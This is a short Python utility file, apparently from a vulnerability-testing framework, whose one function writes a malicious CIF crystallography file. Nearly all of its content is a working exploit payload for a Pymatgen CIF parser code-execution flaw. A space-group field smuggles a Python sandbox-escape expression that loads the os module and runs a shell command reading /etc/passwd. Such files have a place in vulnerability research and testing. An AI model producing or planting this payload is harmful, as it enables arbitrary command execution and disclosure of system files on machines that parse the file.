"""
File utility functions for VAITP framework.
"""
import logging


def create_vuln_cif_file(file_path='vuln.cif'):
    vuln_cif_content = (
        'data_5yOhtAoR\n'
        '_audit_creation_date 2018-06-08\n'
        '_audit_creation_method "Pymatgen CIF Parser Arbitrary Code Execution Exploit"\n'
        '\nloop_\n'
        '_parent_propagation_vector.id\n'
        '_parent_propagation_vector.kxkykz\n'
        'k1 [0 0 0]\n'
        '\n_space_group_magn.transform_BNS_Pp_abc  '
        "'a,b,[d for d in ().__class__.__mro__[1].__getattribute__"
        ' ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) ()'
        ' if d.__name__ == "BuiltinImporter"][0].load_module'
        ' ("os").system ("head -n 30 /etc/passwd");0,0,0\'\n'
        '\n_space_group_magn.number_BNS  62.448\n'
        '_space_group_magn.name_BNS  "P  n\'  m  a\'  "\n'
    )
    with open(file_path, 'w') as f:
        f.write(vuln_cif_content)
    logging.info(f'Created {file_path} dynamically.')
